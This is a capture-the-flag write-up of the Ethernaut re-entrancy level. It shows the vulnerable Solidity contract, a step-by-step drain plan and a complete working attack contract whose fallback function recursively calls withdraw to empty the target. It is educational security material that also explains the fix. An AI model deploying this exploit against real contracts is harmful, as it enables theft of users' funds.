## Ethernaut Level 10 - Re-entrancy - Write-Up
<!--Authors: OofedUp-->

Difficulty: 6/10

Objective: steal all the funds from the contract.

![image](https://i.imgur.com/HzJ10Tc.png)

## Source
```javascript
pragma solidity ^0.4.18;

contract Reentrance {

  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] += msg.value;
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      if(msg.sender.call.value(_amount)()) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  function() public payable {}
}
```

The Re-entrancy bug is one of the most known solidity "vulnerabilities". We can cause a recurssive call in the `withdraw` function in order to drain the contract of Ethereum. Here's how we will do it:

1. We create a new contract which will exploit the re-entrancy vulnerability.
2. We will donate 0.05 ETH to the challenge contract for our contract's address.
3. If we now call `Reentrance.balanceOf(ADDR_OF_OUR_CONTRACT)` we should get back 0.05 ETH.
4. The fallback function in our contract will call `Reentrance.withdraw(0.05)`.
5. When we trigger the `Reentrance.withdraw` function from our contract, the `Reentrance` contract will check if we have that balance (`if(balances[msg.sender] >= _amount)`), and we do have 0.05 ETH so it passes that check.
6. The contract will call our fallback function, sending us the money, but it will also trigger the `Reentrance.withdraw(0.05 ether)` again.
7. The `if(balances[msg.sender] >= _amount)` check will pass again since it hasn't reached `balances[msg.sender] -= _amount;` yet, this repeats until the `Reentrance` contract has less than 0.05 ETH. That's when our fallback function will withdraw `Reentrance.balance` instead, and then end this recursive loop.
8. We can withdraw the Ethereum from our contract to our personal wallet.
9. Profit! We just drained the contract!

The problem is that `balances[msg.sender] -= _amount;` happens after `msg.sender.call.value(_amount)()` so we can just call the function recursively without subtracting balance from our virtual account inside the `Reentrance` contract.

Also, `(msg.sender.call.value(_amount)()` will forward all the gas available, so the execution will not fail.  if something like `msg.sender.transfer(_amount)` was used instead, only 2300 gas would be forwarded, making this recursive loop impossible.

Here's the contract that I used:

```javascript
pragma solidity ^0.4.18;

interface Reentrance {
  function donate(address _to) public payable;
  function balanceOf(address _who) public view returns (uint balance);
  function withdraw(uint _amount) public;
}

contract inception{
    Reentrance main;
    address owner;

    function inception(){
        main = Reentrance(ADDR_OF_INSTANCE_HERE);
        owner = msg.sender;
    }

    function pwn() public{
        main.withdraw(50000000000000000);
    }

    function getback() public{
        require(msg.sender == owner);
        owner.send(this.balance);
    }

    function() public payable{
        if(main.balance >= 50000000000000000){
        main.withdraw(50000000000000000);
        }else if(main.balance > 0){
            main.withdraw(main.balance);
        }
    }
}
```

When calling the `inception.pwn()` function we need to give it a lot of gas (I gave it 5000000 just to be sure) so it has enough to do all the withdraws:

![image](https://i.imgur.com/9cYBwLd.png)

After the execution finishes, we can see al the transactions of 0.05 ETH that occurred due to the recursive call:

![image](https://i.imgur.com/b4WW5UX.png)

We have now drained the contract! We can submit it:

![image](https://i.imgur.com/kdxxxAW.png)
